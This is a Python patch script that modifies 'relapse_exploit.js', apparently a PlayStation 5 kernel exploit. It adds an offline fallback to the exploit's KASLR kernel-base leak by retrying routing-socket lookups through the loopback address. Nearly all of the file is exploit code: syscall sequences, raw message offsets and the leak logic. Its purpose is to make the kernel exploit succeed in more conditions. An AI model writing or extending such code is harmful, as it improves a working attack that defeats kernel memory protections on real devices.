#!/usr/bin/env python3
"""Offline KASLR fallback for the relapse exploit copy.

Relapse's leakKernelBase() aborts in two offline situations:

- "kaslr: no interface has an address" (Wi-Fi off, no cable): the routing
  socket only needs a destination that has a route, and the loopback address
  always does, even with no NIC configured.
- "kaslr: routing socket rejected the request" (write() < 0, ESRCH): the
  kernel has no route for the first interface address — e.g. the synthetic
  10.77.0.2/24 configured by src/net_offline.c when the PS5 kernel skips the
  connected-route installation on SIOCAIFADDR. The leaked pointer is a kernel
  return address (route-independent), so retrying the lookup against 127.0.0.1
  — whose 127.0.0.0/8 route always exists in the routing table — lets the
  leak proceed.

The payload side (src/net_offline.c) now also installs simulated routes
(subnet + default via 10.77.0.2) so the first attempt usually succeeds; this
patch is the safety net that keeps relapse working either way.

Idempotent: exits 0 when the fallback is already present, 1 when the
upstream code changed and could not be patched.
"""
import pathlib
import sys

REPLACEMENTS = [
    (
        # No interface address at all: fall back to the loopback destination.
        """    const dst = await this.firstInterfaceAddress();
    if (!dst) throw new Error("kaslr: no interface has an address");""",
        """    let dst = await this.firstInterfaceAddress();
    if (!dst) dst = [127, 0, 0, 1]; // offline fallback: lo0 always has a route even with no NIC configured""",
    ),
    (
        # Routing lookup rejected (ESRCH: no route for the interface address,
        # e.g. the synthetic 10.77.0.2 when the kernel skipped the connected
        # route): drain the error reply, then retry against the loopback
        # route, which exists in every kernel. The leak itself is
        # route-independent (it reads a kernel return address from the reply).
        """    if ((await this.sysInt(SYS_WRITE, fd, msg, MSG_LEN)) < 0)
      throw new Error("kaslr: routing socket rejected the request");""",
        """    let wrote = await this.sysInt(SYS_WRITE, fd, msg, MSG_LEN);
    if (wrote < 0 && !(dst[0] === 127 && dst[1] === 0 && dst[2] === 0 && dst[3] === 1)) {
      /* offline fallback: the kernel has no route for the interface address
         (synthetic or stale) — drain any pending error reply, then retry the
         lookup against lo0, whose 127.0.0.0/8 route always exists. */
      this.report("Kernel", "no route for interface address, retrying KASLR leak via loopback", "log");
      const drain = this.alloc(512);
      for (let i = 0; i < 4; i++) {
        if ((await this.sysInt(SYS_RECVFROM, fd, drain, 512, MSG_DONTWAIT, 0, 0)) <= 0) break;
        await sleep(1);
      }
      dst = [127, 0, 0, 1];
      this.writeU32(msg, 20, 0x1235); // fresh rtm_seq
      this.writeU32(msg, 156, (dst[3] << 24) | (dst[2] << 16) | (dst[1] << 8) | dst[0]);
      wrote = await this.sysInt(SYS_WRITE, fd, msg, MSG_LEN);
    }
    if (wrote < 0)
      throw new Error("kaslr: routing socket rejected the request");""",
    ),
]


def main() -> int:
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <relapse-copy>", file=sys.stderr)
        return 2
    target = pathlib.Path(sys.argv[1]) / "src" / "relapse_exploit.js"
    if not target.is_file():
        print(f"error: {target} not found", file=sys.stderr)
        return 2
    text = target.read_text(encoding="utf-8").replace("\r\n", "\n")
    for index, (old, new) in enumerate(REPLACEMENTS, 1):
        if old in text:
            text = text.replace(old, new, 1)
        elif new not in text:
            print(f"error: upstream block #{index} not found — exploit changed upstream?",
                  file=sys.stderr)
            return 1
    target.write_text(text, encoding="utf-8", newline="\n")
    print("relapse: offline KASLR fallback (loopback route retry) applied.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
